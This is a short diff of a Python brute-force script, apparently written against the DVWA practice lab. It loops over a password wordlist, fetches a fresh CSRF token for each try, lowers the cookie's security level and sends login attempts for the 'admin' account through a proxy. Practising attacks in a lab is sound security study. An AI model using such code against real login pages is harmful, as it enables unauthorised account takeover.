@@ -8,21 +8,14 @@ pswd = open("pass.txt", "r").read().split('\n')
 
 for psw in pswd:
     
-    print(session.get(url).text)
-    
     brute_cre = {
         "username": "admin",
         "password": psw,
         "Login": "Login",
-        "user_token": CSRF_Manage.get_token(session, url)
+        "user_token": CSRF_Manage.get_token(session, url, header)
     }
     
-    
-    
     header["Cookie"] = header["Cookie"].replace("security=impossible", "security=high")
-    
-    print(header)
-    
     
     response = session.get(url=url, headers=header, proxies=proxy, params=brute_cre, allow_redirects=False)
     
